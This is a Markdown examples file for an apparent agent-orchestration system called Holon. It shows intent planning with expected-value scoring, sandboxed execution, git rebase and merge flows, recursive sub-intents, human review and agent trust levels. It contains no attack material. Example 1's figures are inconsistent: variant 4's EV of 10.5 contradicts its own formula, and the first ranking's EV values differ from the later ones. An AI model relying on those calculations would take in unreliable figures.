# examples.md

This document provides **concrete examples** of how Holon operates in practice, from simple single-intent executions to
complex multi-level recursive decompositions.

These examples illustrate:

- **Intent creation and planning**
- **Competitive planning with multiple variants**
- **Metric estimation and EV calculation**
- **Execution in sandboxes**
- **Git flow (rebase, merge)**
- **Recursive sub-intent spawning**
- **Human review and promotion**
- **KB extraction and learning**
- **Failure handling and recovery**

---

## Example 1: Simple root intent (bootstrap P(success) estimator)

### Scenario

Human wants to bootstrap the naive P(success) estimator as the first intent in the system.

### Step-by-step execution

#### 1) Intent creation (human-initiated)

```bash
$ holon intent create \
--goal "Implement naive P(success) estimator" \
--constraints '{"entropy_budget": 50, "cost_budget": 200, "time_budget_sec": 3600}' \
--scope '{"allowed_paths": ["holon/metrics/"], "sandbox_required": true}'
```

**Ledger event:**

```json
{
  "event_type": "intent_created",
  "ts": "2026-02-10T10:00:00Z",
  "seq": 1,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "parent_intent_id": null,
    "goal": "Implement naive P(success) estimator",
    "constraints": {
      "entropy_budget": 50,
      "cost_budget": 200,
      "time_budget_sec": 3600
    },
    "scope": {
      "allowed_paths": ["holon/metrics/"],
      "sandbox_required": true
    }
  }
}
```

**Git:**

```bash
$ git checkout -b I-1771890300-bootstrap-p-success/_
```

---

#### 2) Planning phase (agent generates variants)

**Meta-agent dispatches to planner agent:**

- Agent: `agent-planner-01` (Gemini Flash, baseline trust)
- Task: Generate 3 plan variants

**Planner agent generates variants:**

**Variant 1: Weighted feature sum**

```json
{
  "plan_id": "P-1771890301-gemini-cli-gemini-3.6-flash",
  "variant_id": "v1",
  "model": {
    "provider": "gemini",
    "model_id": "gemini-3.6-flash",
    "tier": "flash"
  },
  "plan_graph": {
    "steps": [
      {
        "id": 1,
        "description": "Define feature extraction (coverage, dependencies, novelty, depth)",
        "tool": "python"
      },
      {
        "id": 2,
        "description": "Assign bootstrap weights (0.3, 0.3, -0.2, -0.1)",
        "tool": "python"
      },
      {
        "id": 3,
        "description": "Implement weighted sum formula",
        "tool": "python"
      },
      {
        "id": 4,
        "description": "Clamp to [0, 1]",
        "tool": "python"
      },
      {
        "id": 5,
        "description": "Write unit tests",
        "tool": "pytest"
      }
    ],
    "sub_intents": []
  },
  "predicted": {
    "p_success": 0.75,
    "entropy": 12.0,
    "impact": 80,
    "learning_value": 4.0,
    "cost": 50,
    "ev": "0.75 * 80 + 0.5 * 4.0 - 0.3 * 12.0 - 50 = 8.4",
    "lambda": 0.3,
    "mu": 0.5
  }
}
```

**Variant 2: Lookup table**

```json
{
  "plan_id": "P-1771890302-gemini-cli-gemini-3.6-flash",
  "variant_id": "v2",
  "model": {
    "provider": "gemini",
    "model_id": "gemini-3.6-flash",
    "tier": "flash"
  },
  "plan_graph": {
    "steps": [
      {
        "id": 1,
        "description": "Define intent type categories",
        "tool": "python"
      },
      {
        "id": 2,
        "description": "Create lookup table (type → base P(success))",
        "tool": "python"
      },
      {
        "id": 3,
        "description": "Implement lookup with fallback",
        "tool": "python"
      },
      {
        "id": 4,
        "description": "Write unit tests",
        "tool": "pytest"
      }
    ],
    "sub_intents": []
  },
  "predicted": {
    "p_success": 0.65,
    "entropy": 8.0,
    "impact": 60,
    "learning_value": 3.0,
    "cost": 30,
    "ev": "0.65 * 60 + 0.5 * 3.0 - 0.3 * 8.0 - 30 = 8.1",
    "lambda": 0.3,
    "mu": 0.5
  }
}
```

**Variant 3: Hybrid (lookup + adjustment)**

```json
{
  "plan_id": "P-1771890303-gemini-cli-gemini-3.6-flash",
  "variant_id": "v3",
  "model": {
    "provider": "gemini",
    "model_id": "gemini-3.6-flash",
    "tier": "flash"
  },
  "plan_graph": {
    "steps": [
      {
        "id": 1,
        "description": "Define intent type categories with base scores",
        "tool": "python"
      },
      {
        "id": 2,
        "description": "Extract plan features (novelty, depth)",
        "tool": "python"
      },
      {
        "id": 3,
        "description": "Adjust base score with feature penalties",
        "tool": "python"
      },
      {
        "id": 4,
        "description": "Clamp to [0, 1]",
        "tool": "python"
      },
      {
        "id": 5,
        "description": "Write unit tests",
        "tool": "pytest"
      }
    ],
    "sub_intents": []
  },
  "predicted": {
    "p_success": 0.8,
    "entropy": 15.0,
    "impact": 85,
    "learning_value": 2.0,
    "cost": 60,
    "ev": "0.80 * 85 + 0.5 * 2.0 - 0.3 * 15.0 - 60 = 4.5",
    "lambda": 0.3,
    "mu": 0.5
  }
}
```

**Ledger events:**

```json
{
  "event_type": "plan_variant_created",
  "seq": 2,
  "payload": {
    "plan_id": "P-1771890301-gemini-cli-gemini-3.6-flash",
    ...
  }
}
{
  "event_type": "plan_variant_created",
  "seq": 3,
  "payload": {
    "plan_id": "P-1771890302-gemini-cli-gemini-3.6-flash",
    ...
  }
}
{
  "event_type": "plan_variant_created",
  "seq": 4,
  "payload": {
    "plan_id": "P-1771890303-gemini-cli-gemini-3.6-flash",
    ...
  }
}
```

---

#### 3) Plan evaluation and selection

**Evaluator agent ranks by EV:**

1. v2: EV = 6.6 (winner)
2. v1: EV = 6.4
3. v3: EV = 3.5

**Convergence check:**

- EV gap between v2 and v1: 0.2 (< dominant_plan_threshold of 5.0)
- Only 3 variants generated (< max_variants of 5)
- Planning cost: 140 (< planning_budget of 200)

**Decision:** Generate one more variant to check for improvement.

**Variant 4: Simple heuristic**

```json
{
  "plan_id": "P-1771890304-gemini-cli-gemini-3.6-flash",
  "variant_id": "v4",
  "predicted": {
    "p_success": 0.6,
    "entropy": 5.0,
    "impact": 50,
    "learning_value": 8.0,
    "cost": 20,
    "ev": "0.60 * 50 + 0.5 * 8.0 - 0.3 * 5.0 - 20 = 10.5"
  }
}
```

**Re-rank:**

1. **v4: EV = 8.5 (new winner)**
2. v2: EV = 6.6
3. v1: EV = 6.4
4. v3: EV = 3.5

**Convergence check:**

- EV gap between v4 and v2: 1.9 (< dominant_plan_threshold)
- 4 variants generated
- Planning cost: 160

**Decision:** EV improvement from v2 to v4 is 1.9. This is significant, but not dominant. Generate one more variant.

**Variant 5: Constant baseline**

```json
{
  "plan_id": "P-1771890305-gemini-cli-gemini-3.6-flash",
  "variant_id": "v5",
  "predicted": {
    "p_success": 0.55,
    "entropy": 3.0,
    "impact": 40,
    "learning_value": 2.0,
    "cost": 15,
    "ev": "0.55 * 40 + 0.5 * 2.0 - 0.3 * 3.0 - 15 = 7.1"
  }
}
```

**Final rank:**

1. v4: EV = 10.5 (winner)
2. v1: EV = 8.4
3. v2: EV = 8.1
4. v5: EV = 7.1
5. v3: EV = 4.5

**Convergence check:**

- EV improvement from v4 to v5: -3.4 (negative, no improvement)
- **Convergence reason: EV plateau** (last variant did not improve)

**Ledger events:**

```json
{
  "event_type": "planning_converged",
  "seq": 9,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "variants_considered": [
      "v1",
      "v2",
      "v3",
      "v4",
      "v5"
    ],
    "winner_plan_id": "P-1771890304-gemini-cli-gemini-3.6-flash",
    "reason": "ev_plateau"
  }
}
{
  "event_type": "plan_selected",
  "seq": 10,
  "payload": {
    "plan_id": "P-1771890304-gemini-cli-gemini-3.6-flash",
    "predicted": {
      "p_success": 0.60,
      "entropy": 5.0,
      "impact": 50,
      "learning_value": 8.0,
      "ev": 10.5
    }
  }
}
```

---

#### 4) Execution phase

**Rebase from parent (main) before execution:**

```bash
$ git fetch origin
$ git rebase origin/main
# No conflicts (first intent)
```

**Ledger event:**

```json
{
  "event_type": "git_rebase_completed",
  "seq": 11,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "branch": "I-1771890300-bootstrap-p-success/_",
    "status": "success",
    "conflict_files": []
  }
}
```

**Executor agent executes plan v4:**

**Sandbox creation:**

```bash
$ docker run --rm --network none -v $(pwd):/workspace holon-sandbox:latest
```

**Ledger event:**

```json
{
  "event_type": "sandbox_created",
  "seq": 12,
  "payload": {
    "sandbox_id": "S-20260210-1005-a3f2",
    "sandbox_type": "container"
  }
}
```

**Execute steps:**

```python
# Step 1: Implement simple heuristic
def estimate_p_success_v1(plan, ledger):

    # Simple heuristic: base 0.6, adjust for novelty
    base = 0.6
    novelty_penalty = 0.2 * plan.novelty
    return max(0.0, min(1.0, base - novelty_penalty))

# Step 2: Write to file
with open('holon/metrics/p_success.py', 'w') as f:
        f.write(code)

# Step 3: Write unit tests
# ... test code ...

# Step 4: Run tests
$ pytest
holon / metrics / test_p_success.py
# All tests pass
```

**Ledger events:**

```json
{
  "event_type": "tool_call",
  "seq": 13,
  "payload": {
    "tool_name": "python",
    "exit_code": 0
  }
}
{
  "event_type": "tool_call",
  "seq": 14,
  "payload": {
    "tool_name": "pytest",
    "exit_code": 0
  }
}
```

**Measure actual metrics:**

```python
actual_p_success = 1.0  # Success (tests passed)
actual_entropy = 4.2  # Measured: 1 file modified, 45 lines added, 0 conflicts
actual_impact = 55  # Measured: estimator now callable, tests pass
actual_cost = 18  # Measured: 3 minutes execution time
```

**Ledger event:**

```json
{
  "event_type": "execution_completed",
  "seq": 15,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "status": "success",
    "actual": {
      "p_success": 1.0,
      "entropy": 4.2,
      "impact": 55,
      "learning_value": 7.5,
      "cost": 18
    },
    "calibration": {
      "p_success_error": 0.4,
      "entropy_error": 0.8,
      "impact_error": 5.0,
      "learning_value_error": 0.5
    },
    "metadata": {
      "note": "Errors calculated as |predicted - actual|. Predicted values were: p_success: 0.60, entropy: 5.0, impact: 50"
    }
  }
}
```

**Rebase from parent (main) after execution:**

```bash
$ git fetch origin
$ git rebase origin/main
# No conflicts
```

**Ledger event:**

```json
{
  "event_type": "git_rebase_completed",
  "seq": 16,
  "payload": {
    "status": "success"
  }
}
```

---

#### 5) Human review

**Review package generated:**

```json
{
  "intent_id": "I-1771890300-bootstrap-p-success",
  "goal": "Implement naive P(success) estimator",
  "status": "awaiting_review",
  "branch": "I-1771890300-bootstrap-p-success/_",
  "predicted_metrics": {
    "p_success": 0.6,
    "entropy": 5.0,
    "impact": 50,
    "learning_value": 8.0,
    "ev": 10.5
  },
  "actual_metrics": {
    "p_success": 1.0,
    "entropy": 4.2,
    "impact": 55,
    "learning_value": 7.5,
    "ev": 12.5
  },
  "calibration": {
    "p_success_error": 0.4,
    "entropy_error": 0.8,
    "impact_error": 5.0,
    "learning_value_error": 0.5
  },
  "diff_summary": {
    "files_modified": 2,
    "lines_added": 45,
    "lines_deleted": 0
  },
  "test_results": {
    "passed": 5,
    "failed": 0,
    "coverage": 0.92
  }
}
```

**Ledger event:**

```json
{
  "event_type": "human_review_requested",
  "seq": 17,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "review_kind": "promotion"
  }
}
```

**Human reviews and approves:**

```bash
$ holon review approve I-1771890300-bootstrap-p-success
```

**Ledger event:**

```json
{
  "event_type": "human_review_decision",
  "seq": 18,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "decision": "approved",
    "reviewer": "human@example.com"
  }
}
```

---

#### 6) Merge to main

```bash
$ git checkout main
$ git merge I-1771890300-bootstrap-p-success/_
$ git push origin main
```

**Ledger event:**

```json
{
  "event_type": "intent_promoted_to_main",
  "seq": 19,
  "payload": {
    "intent_id": "I-1771890300-bootstrap-p-success",
    "merge_sha": "def456"
  }
}
```

---

## Example 2: Recursive sub-intent decomposition

### Scenario

Human creates a root intent to "Implement metrics module". Agent decomposes into sub-intents. Each sub-intent branch
nests under the plan that listed it (`P-1771890501-claude-code-claude-sonnet-4.6` for the root's sub-intents), so the
branch path records which plan spawned it.

> [!NOTE] The merge steps below show the target model of automatic sub-intent merges. In the current `holon flow`, the
> children run one at a time, each through the full pipeline, and each opens a PR into its parent intent branch that the
> maintainer merges; nesting stops at `MAX_SUB_INTENT_DEPTH`.

### Intent hierarchy

```
I-1771890500-implement-metrics-module (parent)
└── P-1771890501-claude-code-claude-sonnet-4.6 (plan, decided the split)
    ├── I-1771890502-implement-p-success (sub-intent)
    ├── I-1771890503-implement-entropy (sub-intent)
    │   └── P-1771890506-claude-code-claude-sonnet-4.6 (plan, decided the split)
    │       ├── I-1771890507-define-entropy-sources (sub-sub-intent)
    │       └── I-1771890508-implement-entropy-formula (sub-sub-intent)
    ├── I-1771890504-implement-impact (sub-intent)
    └── I-1771890505-implement-ev (sub-intent)
```

### Git branch structure

Each node below elides the path of the node above it with `…/`.

```
main
└── I-1771890500-implement-metrics-module/_
    └── …/P-1771890501-claude-code-claude-sonnet-4.6/_
        ├── …/I-1771890502-implement-p-success/_
        ├── …/I-1771890503-implement-entropy/_
        │   └── …/P-1771890506-claude-code-claude-sonnet-4.6/_
        │       ├── …/I-1771890507-define-entropy-sources/_
        │       └── …/I-1771890508-implement-entropy-formula/_
        ├── …/I-1771890504-implement-impact/_
        └── …/I-1771890505-implement-ev/_
```

For example, `…/I-1771890507-define-entropy-sources/_` is
`I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890503-implement-entropy/P-1771890506-claude-code-claude-sonnet-4.6/I-1771890507-define-entropy-sources/_`.

### Execution flow

#### 1) Root intent created (human)

```bash
$ holon intent create --goal "Implement metrics module" --constraints '{"entropy_budget": 150}'
```

**Intent ID:** `I-1771890500-implement-metrics-module`

**Git:**

```bash
$ git checkout -b I-1771890500-implement-metrics-module/_
```

---

#### 2) Planning phase (agent decomposes)

**Planner agent (medium trust) generates plan with sub-intents:**

```json
{
  "plan_id": "P-1771890501-claude-code-claude-sonnet-4.6",
  "plan_graph": {
    "steps": [
      {
        "id": 1,
        "description": "Create module structure",
        "tool": "bash"
      },
      {
        "id": 2,
        "description": "Spawn sub-intents for each estimator",
        "tool": "meta"
      }
    ],
    "sub_intents": [
      {
        "slug": "implement-p-success",
        "goal": "Implement P(success) estimator"
      },
      {
        "slug": "implement-entropy",
        "goal": "Implement entropy estimator"
      },
      {
        "slug": "implement-impact",
        "goal": "Implement impact estimator"
      },
      {
        "slug": "implement-ev",
        "goal": "Implement EV calculator"
      }
    ]
  },
  "predicted": {
    "p_success": 0.85,
    "entropy": 45.0,
    "impact": 200,
    "learning_value": 5.0,
    "cost": 150,
    "ev": "0.85 * 200 + 0.5 * 5.0 - 0.3 * 45.0 - 150 = 9.0"
  }
}
```

**Plan selected:** v1 (only variant, EV positive)

---

#### 3) Execution: Create module structure

```bash
$ mkdir -p holon/metrics
$ touch holon/metrics/__init__.py
$ git add holon/metrics
$ git commit -m "Create metrics module structure"
```

---

#### 4) Spawn sub-intent 1: Implement P(success)

**Intent created:**

```json
{
  "intent_id": "I-1771890502-implement-p-success",
  "parent_intent_id": "I-1771890500-implement-metrics-module",
  "deciding_branch": "I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/_",
  "parent_plan_id": "P-1771890501-claude-code-claude-sonnet-4.6",
  "goal": "Implement P(success) estimator",
  "constraints": {
    "entropy_budget": 37.5
  }
  // 150 * 0.25 (fraction of parent)
}
```

**Git:**

```bash
$ git checkout -b I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890502-implement-p-success/_
```

**Rebase from parent before execution:**

```bash
$ git rebase I-1771890500-implement-metrics-module/_
```

**Execute:** (similar to Example 1)

**Rebase from parent after execution:**

```bash
$ git rebase I-1771890500-implement-metrics-module/_
```

**Merge to parent (target model: no human review for sub-intent):**

```bash
$ git checkout I-1771890500-implement-metrics-module/_
$ git merge I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890502-implement-p-success/_
```

**Ledger event:**

```json
{
  "event_type": "git_merge_attempted",
  "seq": 45,
  "payload": {
    "intent_id": "I-1771890502-implement-p-success",
    "from_branch": "I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890502-implement-p-success/_",
    "to_branch": "I-1771890500-implement-metrics-module/_",
    "status": "success"
  }
}
```

---

#### 5) Spawn sub-intent 2: Implement entropy (with further decomposition)

**Intent created:**

```json
{
  "intent_id": "I-1771890503-implement-entropy",
  "parent_intent_id": "I-1771890500-implement-metrics-module",
  "deciding_branch": "I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/_",
  "parent_plan_id": "P-1771890501-claude-code-claude-sonnet-4.6",
  "goal": "Implement entropy estimator"
}
```

**Planner agent (medium trust) decomposes further:**

```json
{
  "plan_id": "P-1771890506-claude-code-claude-sonnet-4.6",
  "plan_graph": {
    "sub_intents": [
      {
        "slug": "define-entropy-sources",
        "goal": "Define entropy sources"
      },
      {
        "slug": "implement-entropy-formula",
        "goal": "Implement entropy formula"
      }
    ]
  }
}
```

**Git branches:**

```
I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890503-implement-entropy/_
└── …/P-1771890506-claude-code-claude-sonnet-4.6/_
    ├── …/I-1771890507-define-entropy-sources/_
    └── …/I-1771890508-implement-entropy-formula/_
```

**Each sub-sub-intent:**

1. Rebases from parent (`I-1771890503-implement-entropy`) before execution
2. Executes
3. Rebases from parent after execution
4. Merges to parent (target model: no human review)

**After both sub-sub-intents complete:**

```bash
$ git checkout I-1771890500-implement-metrics-module/_
$ git merge I-1771890500-implement-metrics-module/P-1771890501-claude-code-claude-sonnet-4.6/I-1771890503-implement-entropy/_
```

---

#### 6) Complete remaining sub-intents

Sub-intents 3 and 4 execute similarly, merging to parent.

---

#### 7) Parent intent complete

**All sub-intents merged to parent branch.**

**Rebase from main:**

```bash
$ git checkout I-1771890500-implement-metrics-module/_
$ git rebase origin/main
```

**Human review requested** (parent intent).

**Human approves.**

**Merge to main:**

```bash
$ git checkout main
$ git merge I-1771890500-implement-metrics-module/_
$ git push origin main
```

**Ledger event:**

```json
{
  "event_type": "intent_promoted_to_main",
  "seq": 89,
  "payload": {
    "intent_id": "I-1771890500-implement-metrics-module",
    "merge_sha": "abc789"
  }
}
```

---

## Example 3: Rebase conflict and resolution

### Scenario

Two sub-intents modify the same file concurrently, causing a rebase conflict. This is the target model: the current flow
runs sibling sub-intents one at a time.

### Setup

**Parent intent:** `I-1771890600-refactor-metrics`

**Deciding plan:** `P-1771890601-claude-code-claude-sonnet-4.6` (both sub-intent branches nest under it)

**Sub-intents (concurrent):**

- `I-1771890602-add-caching` (modifies `holon/metrics/p_success.py`)
- `I-1771890603-add-logging` (modifies `holon/metrics/p_success.py`)

### Execution

#### 1) Sub-intent `add-caching` completes first

```bash
$ git checkout I-1771890600-refactor-metrics/_
$ git merge I-1771890600-refactor-metrics/P-1771890601-claude-code-claude-sonnet-4.6/I-1771890602-add-caching/_
# Merge successful
```

---

#### 2) Sub-intent `add-logging` attempts rebase after execution

```bash
$ git checkout I-1771890600-refactor-metrics/P-1771890601-claude-code-claude-sonnet-4.6/I-1771890603-add-logging/_
$ git rebase I-1771890600-refactor-metrics/_
# CONFLICT in holon/metrics/p_success.py
```

**Ledger event:**

```json
{
  "event_type": "git_rebase_completed",
  "seq": 102,
  "payload": {
    "intent_id": "I-1771890603-add-logging",
    "status": "conflict",
    "conflict_files": ["holon/metrics/p_success.py"]
  }
}
```

---

#### 3) Agent detects conflict

**Executor agent logs conflict and aborts rebase:**

```bash
$ git rebase --abort
```

**Agent spawns reactive intent:**

The executor of `I-1771890603-add-logging` (plan `P-1771890604-claude-code-claude-sonnet-4.6`, execution
`E-1771890605-add-logging`) decides this split during execution, so the reactive sub-intent nests under that execution:
`I-1771890600-refactor-metrics/P-1771890601-claude-code-claude-sonnet-4.6/I-1771890603-add-logging/P-1771890604-claude-code-claude-sonnet-4.6/E-1771890605-add-logging/I-1771890606-resolve-conflict/_`.
This execution-decided split illustrates the general rule only; the example's main split stays plan-decided.

```json
{
  "intent_id": "I-1771890606-resolve-conflict",
  "parent_intent_id": "I-1771890603-add-logging",
  "deciding_branch": "I-1771890600-refactor-metrics/P-1771890601-claude-code-claude-sonnet-4.6/I-1771890603-add-logging/P-1771890604-claude-code-claude-sonnet-4.6/E-1771890605-add-logging/_",
  "parent_plan_id": "P-1771890604-claude-code-claude-sonnet-4.6",
  "parent_execution_id": "E-1771890605-add-logging",
  "goal": "Resolve rebase conflict in p_success.py",
  "intent_type": "reactive",
  "trigger": "rebase_conflict"
}
```

---

#### 4) Conflict resolution intent executes

**Planner agent generates plan:**

```json
{
  "plan_graph": {
    "steps": [
      {
        "id": 1,
        "description": "Fetch parent changes",
        "tool": "git"
      },
      {
        "id": 2,
        "description": "Identify conflict regions",
        "tool": "git"
      },
      {
        "id": 3,
        "description": "Apply logging changes to updated file",
        "tool": "python"
      },
      {
        "id": 4,
        "description": "Run tests",
        "tool": "pytest"
      },
      {
        "id": 5,
        "description": "Commit resolution",
        "tool": "git"
      }
    ]
  }
}
```

**Executor agent resolves conflict:**

```bash
$ git rebase I-1771890600-refactor-metrics/_
# Manual conflict resolution by agent
$ git add holon/metrics/p_success.py
$ git rebase --continue
$ pytest holon/metrics/test_p_success.py
# Tests pass
```

**Ledger event:**

```json
{
  "event_type": "git_rebase_completed",
  "seq": 108,
  "payload": {
    "intent_id": "I-1771890606-resolve-conflict",
    "status": "success",
    "conflict_files": []
  }
}
```

---

#### 5) Sub-intent `add-logging` merges to parent

```bash
$ git checkout I-1771890600-refactor-metrics/_
$ git merge I-1771890600-refactor-metrics/P-1771890601-claude-code-claude-sonnet-4.6/I-1771890603-add-logging/_
# Merge successful (conflict already resolved)
```

---

## Example 4: Agent proposes new intent (autonomous goal-setting)

### Scenario

Agent (high trust) notices calibration error increasing and proposes an intent to improve the estimator.

### Execution

#### 1) Agent monitors calibration

**Curator agent scans ledger:**

```python
recent_executions = ledger.query_executions(since=now() - timedelta(days=7))
mean_p_success_error = mean(e.calibration.p_success_error for e in recent_executions)
# mean_p_success_error = 0.42 (high!)
```

---

#### 2) Agent proposes intent

```json
{
  "proposed_intent": {
    "intent_id": "I-1771891100-improve-p-success-estimator",
    "goal": "Improve P(success) estimator to reduce calibration error",
    "rationale": "Mean calibration error over last 7 days is 0.42, exceeding threshold of 0.30",
    "evidence": {
      "ledger_refs": [
        "I-1771891051-implement-cost-estimator",
        "I-1771891062-tune-entropy-weights",
        "I-1771891071-implement-routing-roi"
      ],
      "mean_error": 0.42,
      "sample_size": 15
    }
  },
  "proposed_by": "agent-curator-05",
  "trust_level": "high"
}
```

**Ledger event:**

```json
{
  "event_type": "intent_proposed",
  "seq": 150,
  "payload": {
    "intent_id": "I-1771891100-improve-p-success-estimator",
    "proposed_by": "agent-curator-05",
    "quality_score": 0.78
  }
}
```

---

#### 3) Intent quality scoring

```python
quality_score = score_intent_quality(proposed_intent, "agent-curator-05", ledger, kb)
# quality_score = 0.78
# - Addresses calibration error: +0.3
# - Fills KB gap: +0.0 (estimator already exists)
# - Responds to failure: +0.0
# - Novelty: +0.2 (improvement, not new)
# - Agent trust: +0.18 (trust_score = 0.9)
# - Predicted EV: +0.1 (EV = 45)
```

---

#### 4) Approval gate

```python
approval = approve_intent_proposal(proposed_intent, "agent-curator-05", quality_score=0.78)
# approval = "auto_approved" (high trust + quality > 0.6)
```

**Ledger event:**

```json
{
  "event_type": "intent_approved",
  "seq": 151,
  "payload": {
    "intent_id": "I-1771891100-improve-p-success-estimator",
    "approval_type": "auto_approved",
    "quality_score": 0.78
  }
}
```

---

#### 5) Intent executes

Intent proceeds through normal lifecycle:

- Planning (generate variants)
- Execution (implement improved estimator)
- Measurement (backtest on historical data)
- Human review (estimator change requires human approval)
- Promotion to main (if approved)

---

## Example 5: KB extraction (pattern learning)

### Scenario

After 5 successful intents with similar structure, curator agent extracts a pattern.

### Execution

#### 1) Curator scans ledger

```python
intents = ledger.query_intents(status="success", since=now() - timedelta(days=14))
# Found 5 intents with similar structure:
# - I-1771890300-bootstrap-p-success, I-1771890504-implement-impact, I-1771891052-implement-learning-value-estimator, I-1771891071-implement-routing-roi, I-1771891081-implement-calibration-error
# All implement estimators with similar steps
```

---

#### 2) Extract common structure

```python
pattern = extract_common_structure(intents)
# Pattern:
# 1. Define feature extraction
# 2. Assign weights
# 3. Implement formula
# 4. Clamp to valid range
# 5. Write unit tests
```

---

#### 3) Validate evidence threshold

```python
validate_evidence(pattern, intents)
# success_count = 5 (>= 3, threshold met)
# failure_count = 0
# avg_p_success = 0.88
# avg_entropy = 14.2
```

---

#### 4) Propose KB entry

```json
{
  "kb_id": "KB-pattern-001",
  "kb_type": "pattern",
  "version": "1.0",
  "status": "proposed",
  "evidence": {
    "ledger_refs": [
      "I-1771890300-bootstrap-p-success",
      "I-1771890504-implement-impact",
      "I-1771891052-implement-learning-value-estimator",
      "I-1771891071-implement-routing-roi",
      "I-1771891081-implement-calibration-error"
    ],
    "success_count": 5,
    "failure_count": 0,
    "avg_p_success": 0.88,
    "avg_entropy": 14.2
  },
  "payload": {
    "name": "Weighted Feature Sum for Estimators",
    "description": "Implement estimators as weighted sums of features with clamping",
    "structure": {
      "steps": [
        "Define feature extraction",
        "Assign weights",
        "Implement formula",
        "Clamp to valid range",
        "Write unit tests"
      ]
    }
  }
}
```

**Ledger event:**

```json
{
  "event_type": "kb_entry_proposed",
  "seq": 200,
  "payload": {
    "kb_id": "KB-pattern-001",
    "kb_type": "pattern",
    "proposed_by": "agent-curator-03"
  }
}
```

---

#### 5) Human approval

```bash
$ holon kb approve KB-pattern-001
```

**KB entry status changed to "active".**

**Ledger event:**

```json
{
  "event_type": "kb_entry_approved",
  "seq": 201,
  "payload": {
    "kb_id": "KB-pattern-001",
    "approved_by": "human@example.com"
  }
}
```

---

#### 6) Pattern used in future planning

**Next time an agent plans an estimator intent:**

```python
patterns = kb.find_similar_intents(intent.goal, intent.constraints)
# Returns: [KB-pattern-001]

# Agent uses pattern to generate plan
plan = generate_plan_from_pattern(intent, patterns[0])
# Plan follows proven structure, higher predicted P(success)
```

---

## Example 6: Model routing based on complexity

### Scenario

Two intents with different complexity levels are routed to different model tiers.

### Intent A: Low complexity (familiar work)

**Intent:** "Add docstrings to existing functions"

**Predicted metrics:**

- `entropy = 5.0` (low)
- `novelty = 0.2` (familiar)
- `complexity = 0.3` (simple)

**Routing decision:**

```python
model = router.select_model(predicted_entropy=5.0, novelty=0.2, complexity=0.3)
# Returns: gemini-3.6-flash (flash tier)
# Reason: "Low entropy and familiar work, fast model sufficient"
```

**Ledger event:**

```json
{
  "event_type": "model_routed",
  "seq": 250,
  "payload": {
    "intent_id": "I-1771891150-add-docstrings",
    "model": {
      "provider": "gemini",
      "model_id": "gemini-3.6-flash",
      "tier": "flash"
    },
    "routing_reason": "Low entropy and familiar work"
  }
}
```

**Execution cost:** 10 units (fast, cheap)

**Actual outcome:** Success, EV = 8.5

**Routing ROI:** `(8.5 - 10) / 10 = -0.15` (negative, but acceptable for low-risk work)

---

### Intent B: High complexity (novel problem)

**Intent:** "Design new entropy estimation algorithm"

**Predicted metrics:**

- `entropy = 45.0` (high)
- `novelty = 0.9` (novel)
- `complexity = 0.8` (complex)

**Routing decision:**

```python
model = router.select_model(predicted_entropy=45.0, novelty=0.9, complexity=0.8)
# Returns: gemini-3.6-flash-thinking (deep tier)
# Reason: "High entropy and novel problem, deep reasoning required"
```

**Ledger event:**

```json
{
  "event_type": "model_routed",
  "seq": 275,
  "payload": {
    "intent_id": "I-1771891200-design-entropy-algorithm",
    "model": {
      "provider": "gemini",
      "model_id": "gemini-3.6-flash-thinking",
      "tier": "deep"
    },
    "routing_reason": "High entropy and novel problem"
  }
}
```

**Execution cost:** 120 units (slow, expensive)

**Actual outcome:** Success, EV = 85.0

**Routing ROI:** `(85.0 - 120) / 120 = -0.29` (negative cost, but high impact justifies it)

---

## Example 7: Failure mode extraction and mitigation

### Scenario

After 3 intents fail with rebase conflicts, curator extracts a failure mode.

### Execution

#### 1) Curator detects repeated failures

```python
failures = ledger.query_intents(status="failure", since=now() - timedelta(days=7))
conflict_failures = [f for f in failures if "rebase_conflict" in f.failure_reason]
# Found 3 failures: I-1771891122-add-metric-caching, I-1771891131-add-metric-logging, I-1771891143-refactor-p-success
```

---

#### 2) Analyse root cause

```python
root_cause = analyse_root_cause(conflict_failures)
# Root cause: "Concurrent sub-intents modifying same file (holon/metrics/p_success.py)"
```

---

#### 3) Identify mitigations

```python
mitigations = [
    {"strategy": "Sequential merges", "effectiveness": 0.95},
    {"strategy": "Finer-grained decomposition", "effectiveness": 0.85},
    {"strategy": "Conflict-aware entropy estimation", "effectiveness": 0.70},
]
```

---

#### 4) Propose failure mode KB entry

```json
{
  "kb_id": "KB-failure-001",
  "kb_type": "failure_mode",
  "payload": {
    "name": "Rebase Conflict from Concurrent File Edits",
    "symptoms": [
      "rebase_conflict",
      "file_overlap > 0.5"
    ],
    "root_causes": [
      "Insufficient work decomposition",
      "No coordination between sub-intents"
    ],
    "mitigations": [
      ...
    ]
  }
}
```

---

#### 5) Future intents use mitigation

**Next time planner generates plan with concurrent sub-intents:**

```python
failure_modes = kb.find_failure_modes(module_path="holon/metrics/p_success.py")
# Returns: [KB-failure-001]

# Planner adjusts plan:
# - Increase predicted entropy (conflict risk)
# - Add sequential merge constraint
# - Or decompose more finely to avoid file overlap
```

## Example 8: Trust Level Progression Walkthrough

### Scenario

A new agent `gemini-coder-01` starts at the **Baseline** trust level and is promoted to **Medium** trust after
completing 10 successful intents with high calibration accuracy.

### Execution

#### 1) Initial state in Ledger

```json
{
  "agent_id": "gemini-coder-01",
  "trust_level": "baseline",
  "executions_completed": 0,
  "trust_score": 0.0
}
```

#### 2) Agent completes 10 baseline intents successfully

Over the course of 10 simple intents (e.g., adding unit tests, documentation, simple refactoring), the agent achieves:

- **Success Rate:** $100\%$ ($10$ out of $10$ succeed).
- **Predictions vs. Actuals:**
  - Plotted average predicted $P(success) = 0.85$. Actual success for all was $1.0$.
  - Mean calibration error: $0.15$.
